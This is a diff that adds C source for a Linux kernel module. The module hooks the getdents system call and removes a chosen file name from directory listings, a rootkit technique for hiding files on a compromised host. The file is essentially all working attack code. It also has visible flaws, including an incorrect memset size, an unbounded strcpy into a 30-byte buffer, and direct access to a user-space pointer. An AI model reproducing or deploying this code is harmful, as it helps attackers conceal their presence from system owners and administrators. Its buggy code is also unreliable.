@@ -1,0 +1,63 @@
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <linux/kernel.h>
+#include <linux/uaccess.h>
+#include "hide_file.h"
+#include "hooking.h"
+
+#define MAX_NAME_LENGTH 30
+
+struct linux_dirent {
+	unsigned long  d_ino;
+	unsigned long  d_off;
+	unsigned short d_reclen;
+	char           d_name[];
+};
+
+
+static t_syscall old_getdents;
+static asmlinkage long new_getdents(const struct pt_regs *pt_regs);
+static char file_name[MAX_NAME_LENGTH];
+
+int init_hide_file(char *f_name){
+	if (!f_name){
+		printk(KERN_INFO "[-] No file name to hide given.\n");
+		return -1;
+	}
+
+	memset(file_name,0,sizeof(MAX_NAME_LENGTH));
+	strcpy(file_name,f_name);
+	old_getdents = get_syscall(__NR_getdents);
+	if (add_hook((unsigned long) new_getdents, __NR_getdents)) {
+		return -1;
+	}
+	return 0;
+}
+
+static asmlinkage long new_getdents(const struct pt_regs *pt_regs) {
+	int nread, bpos, reclen;
+	long len;
+	char *next;
+	struct linux_dirent *dirp = (struct linux_dirent *)pt_regs->si;
+
+	nread = old_getdents(pt_regs);
+
+	bpos = 0;
+	// going through the linux_dirent structs
+	while (bpos < nread) {
+		if (!strcmp(dirp->d_name, file_name)) {
+			reclen = dirp->d_reclen;
+			next = (char *) dirp + reclen;
+			len = pt_regs->si + nread - (long) next;
+			memmove(dirp, next, len);
+			nread -= reclen;
+			continue;
+        }
+		bpos += dirp->d_reclen;
+		dirp = (struct linux_dirent*)((char*)pt_regs->si + bpos);
+	}
+
+	return nread;
+}
